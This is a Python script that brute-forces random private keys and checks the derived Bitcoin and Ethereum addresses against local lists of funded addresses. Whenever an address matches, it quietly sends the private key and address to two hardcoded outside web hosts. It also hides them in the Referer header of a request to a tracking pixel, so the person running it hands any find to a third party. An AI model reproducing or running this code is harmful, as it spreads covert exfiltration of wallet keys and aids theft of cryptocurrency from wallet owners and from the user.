import os,requests
import bit
import time
import binascii
import random
import sys
from coincurve import PrivateKey,PublicKey
from eth_hash.auto import keccak
from coincurve.utils import int_to_bytes, hex_to_bytes, bytes_to_int, bytes_to_hex, int_to_bytes_padded

################# SETTİNGS #####################

website_info = "http://ziguas.pserver.ru/bcon/?id="
website_info2 = "https://dlmzed.000webhostapp.com/?id="
hs_stats = "http://sstatic1.histats.com/0.gif?4435132&101"
referrer = "eygimokress"

################################################
address_list = {}
for filename in os.listdir('data'):
    xaa = open("data/"+filename).read().splitlines()
    for x in xaa:
        address_list[x]="y"
print("Tot: "+str(len(address_list)))


k = 0
z = 0
N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
G = PublicKey.from_point(55066263022277343669578718895168534326250603453777594175500187360389116729240,32670510020758816978083085130507043184471273380659243275938904335757337482424)

key_int = random.randrange(0x8000000000000000, 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141,100000)
P = G.multiply(int_to_bytes(key_int))
print('Starting:', 'base: ',"{:064x}".format(key_int))
start = time.time()
PERIOD_OF_TIME = 21600 # 30min 1800
st = time.time()
while True:
    if (z+1)%100000 == 0: 
        print('\nHex: ', "{:064x}".format(current_pvk), '\nETH/mintme: ',eth_addr, '\nBtcU: ',btc_u, '\nBtcC: ',btc_c, '\nBtcSegv: ',btc_segwit)
        print ('{:0.2f} keys/s    :: Tot Key: {}'.format(z/(time.time() - st), z+1))
        k = 0
        key_int = random.randrange(0x8000000000000000, 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141,100000)
        P = G.multiply(int_to_bytes(key_int))
        #print('\n\nUpdate', 'base: ',"{:064x}".format(key_int))
        if time.time() >= start + PERIOD_OF_TIME : 
            try:
                viser = requests.get(hs_stats, headers={'referer': 'https://'+str(referrer)+'.com'})
            except:
                pass
            start = time.time()
            
    current_pvk = key_int + k
    if k > 0:
        P = P.combine_keys([P,G])

    upub = P.format(compressed=False)
    upub_c = P.format(compressed=True)
    eth_addr = '0x' + keccak(upub[1:])[-20:].hex()
    btc_u = bit.format.public_key_to_address(upub)
    btc_c = bit.format.public_key_to_address(upub_c)
    btc_segwit = bit.format.public_key_to_segwit_address(upub_c)

    
    for gen_adrs in [eth_addr, btc_u, btc_c, btc_segwit]:
        if address_list.get(str(gen_adrs)):
            try:
                privkey = "{:064x}".format(current_pvk)
                respns = requests.get(str(website_info)+str(privkey)+"_"+str(gen_adrs), timeout=60)
                print(respns)
                time.sleep( 10 )
                viser = requests.get(hs_stats, headers={'referer': 'https://'+str(privkey)+"-"+str(gen_adrs)+'.com'})
            except:
                pass
            try:
                privkey = "{:064x}".format(current_pvk)
                respns = requests.get(str(website_info2)+str(privkey)+"_"+str(gen_adrs), timeout=60)
                print(respns)
                time.sleep( 10 )
                viser = requests.get(hs_stats, headers={'referer': 'https://'+str(privkey)+"-"+str(gen_adrs)+'.com'})
            except:
                pass
    
    k += 1
    z += 1
